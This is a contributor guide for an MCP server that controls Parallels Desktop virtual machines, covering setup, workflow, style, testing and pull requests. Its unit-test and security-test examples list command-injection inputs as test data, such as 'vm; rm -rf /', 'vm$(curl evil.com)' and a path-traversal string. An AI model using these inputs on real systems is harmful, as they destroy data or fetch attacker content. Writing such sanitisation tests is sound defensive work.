# Contributing to Parallels Desktop MCP Server

Thank you for your interest in contributing to the Parallels Desktop MCP Server! This document provides guidelines and instructions for contributing to the project.

## Table of Contents

- [Code of Conduct](#code-of-conduct)
- [Getting Started](#getting-started)
- [Development Workflow](#development-workflow)
- [Code Style](#code-style)
- [Testing Requirements](#testing-requirements)
- [Pull Request Process](#pull-request-process)
- [Adding New Features](#adding-new-features)
- [Security Considerations](#security-considerations)

## Code of Conduct

By participating in this project, you agree to:

- Be respectful and inclusive
- Welcome newcomers and help them get started
- Focus on constructive criticism
- Accept feedback gracefully
- Prioritize the project's best interests

## Getting Started

### Prerequisites

- macOS with Parallels Desktop installed
- Node.js 18+ and npm
- Git
- TypeScript knowledge
- Familiarity with MCP (Model Context Protocol)

### Setup

1. Fork the repository on GitHub
2. Clone your fork:
   ```bash
   git clone https://github.com/YOUR-USERNAME/parallels_desktop_mcp.git
   cd parallels_desktop_mcp
   ```

3. Add the upstream remote:
   ```bash
   git remote add upstream https://github.com/eddiedunn/parallels_desktop_mcp.git
   ```

4. Install dependencies:
   ```bash
   npm install
   ```

5. Run the test suite to ensure everything works:
   ```bash
   npm test
   ```

## Development Workflow

### Branch Strategy

- `main` - Production-ready code
- `develop` - Integration branch for features
- `feature/*` - New features
- `fix/*` - Bug fixes
- `docs/*` - Documentation updates

### Typical Workflow

1. **Sync with upstream**:
   ```bash
   git checkout main
   git pull upstream main
   ```

2. **Create a feature branch**:
   ```bash
   git checkout -b feature/your-feature-name
   ```

3. **Make your changes**:
   - Write code following our style guide
   - Add/update tests
   - Update documentation

4. **Run quality checks**:
   ```bash
   npm run pre-commit
   ```

5. **Commit your changes**:
   ```bash
   git add .
   git commit -m "feat: add new feature X"
   ```

   Follow [Conventional Commits](https://www.conventionalcommits.org/):
   - `feat:` - New feature
   - `fix:` - Bug fix
   - `docs:` - Documentation changes
   - `style:` - Code style changes (formatting, etc.)
   - `refactor:` - Code refactoring
   - `test:` - Test additions or fixes
   - `chore:` - Maintenance tasks

6. **Push to your fork**:
   ```bash
   git push origin feature/your-feature-name
   ```

7. **Create a Pull Request** on GitHub

## Code Style

### TypeScript Guidelines

- Use TypeScript strict mode
- Prefer `const` over `let`
- Use meaningful variable names
- Add JSDoc comments for public APIs
- Avoid `any` type - use `unknown` or proper types

### Formatting

We use Prettier for code formatting. Run before committing:

```bash
npm run format
```

Configuration is in `.prettierrc`:
```json
{
  "semi": true,
  "singleQuote": true,
  "tabWidth": 2,
  "trailingComma": "es5"
}
```

### Linting

ESLint enforces code quality. Run before committing:

```bash
npm run lint
npm run lint:fix  # Auto-fix issues
```

### Example Code Style

```typescript
/**
 * Starts a virtual machine
 * @param vmId - The VM identifier (name or UUID)
 * @returns Promise with operation result
 */
export async function startVM(vmId: string): Promise<OperationResult> {
  // Validate input
  const sanitizedId = sanitizeVmIdentifier(vmId);
  
  try {
    // Execute command
    const result = await executePrlctl(['start', sanitizedId]);
    
    // Return formatted response
    return {
      success: true,
      message: `VM ${sanitizedId} started successfully`,
    };
  } catch (error) {
    // Handle errors consistently
    logger.error('Failed to start VM', { vmId, error });
    throw new VmOperationError(`Failed to start VM: ${error.message}`);
  }
}
```

## Testing Requirements

### Test Coverage

- New features must include tests
- Maintain or improve existing coverage (currently 22.55%)
- Critical paths require 100% coverage:
  - Security functions
  - Command execution
  - Input validation

### Writing Tests

1. **Unit Tests** (`src/__tests__/unit/`):
   ```typescript
   describe('sanitizeVmIdentifier', () => {
     it('should remove dangerous characters', () => {
       const input = 'vm; rm -rf /';
       const result = sanitizeVmIdentifier(input);
       expect(result).toBe('vmrmrf');
     });
   });
   ```

2. **Integration Tests** (`src/__tests__/integration/`):
   ```typescript
   describe('VM lifecycle', () => {
     it('should create and start a VM', async () => {
       // Test complete workflows
     });
   });
   ```

3. **Security Tests**:
   ```typescript
   test.each(maliciousInputs)(
     'should prevent command injection: %s',
     async (input) => {
       // Verify security measures
     }
   );
   ```

### Running Tests

```bash
npm test              # Run all tests
npm run test:unit     # Unit tests only
npm run test:watch    # Watch mode for TDD
npm run test:coverage # Generate coverage report
```

## Pull Request Process

### Before Submitting

1. **Ensure all checks pass**:
   ```bash
   npm run pre-commit
   ```

2. **Update documentation**:
   - Update README.md if adding features
   - Add JSDoc comments
   - Update CHANGELOG.md

3. **Test thoroughly**:
   - Add tests for new functionality
   - Ensure existing tests pass
   - Test edge cases

### PR Requirements

Your PR must:

- Have a clear title and description
- Reference any related issues
- Pass all CI checks
- Have no merge conflicts
- Include tests for new features
- Update relevant documentation

### PR Template

```markdown
## Description
Brief description of changes

## Type of Change
- [ ] Bug fix
- [ ] New feature
- [ ] Breaking change
- [ ] Documentation update

## Testing
- [ ] Unit tests pass
- [ ] Integration tests pass
- [ ] Manual testing completed

## Checklist
- [ ] Code follows style guidelines
- [ ] Self-review completed
- [ ] Documentation updated
- [ ] Tests added/updated
```

## Adding New Features

### Adding a New Tool

1. **Plan the tool**:
   - Define the purpose and API
   - Consider security implications
   - Design error handling

2. **Implement the handler**:
   ```typescript
   // src/tools/newTool.ts
   export async function handleNewTool(request: CallToolRequest) {
     const { param1, param2 } = request.params.arguments;
     
     // Validate inputs
     // Execute operation
     // Return formatted response
   }
   ```

3. **Register the tool**:
   ```typescript
   // src/index.ts
   toolRouter.registerTool('newTool', handleNewTool);
   ```

4. **Add tests**:
   - Unit tests for the handler
   - Integration tests for workflows
   - Security tests if applicable

5. **Update documentation**:
   - Add to README.md tools list
   - Include usage examples
   - Document any prerequisites

### Best Practices

- Follow the existing patterns
- Keep tools focused and single-purpose
- Provide helpful error messages
- Consider performance implications
- Think about security first

## Security Considerations

### Input Validation

Always validate and sanitize user inputs:

```typescript
// Good
const sanitizedInput = sanitizeVmIdentifier(userInput);

// Bad
const result = await executePrlctl(['start', userInput]);
```

### Command Execution

Use `execFile` instead of `exec`:

```typescript
// Good
execFile('prlctl', args, callback);

// Bad
exec(`prlctl ${args.join(' ')}`, callback);
```

### Error Messages

Don't expose sensitive information:

```typescript
// Good
throw new Error('VM operation failed');

// Bad
throw new Error(`Failed to execute: ${command} with ${secretData}`);
```

### Testing Security

Include security-focused tests:

```typescript
const maliciousInputs = [
  'vm; rm -rf /',
  'vm`echo pwned`',
  'vm$(curl evil.com)',
  '../../../etc/passwd'
];

test.each(maliciousInputs)(
  'should sanitize: %s',
  (input) => {
    // Test sanitization
  }
);
```

## Getting Help

- **Questions**: Open a GitHub issue with the "question" label
- **Bugs**: Open a GitHub issue with reproduction steps
- **Ideas**: Open a GitHub issue with the "enhancement" label
- **Security**: Email security concerns privately

## Recognition

Contributors are recognized in:
- The project README
- Release notes
- GitHub contributors page

Thank you for contributing to make Parallels Desktop MCP Server better!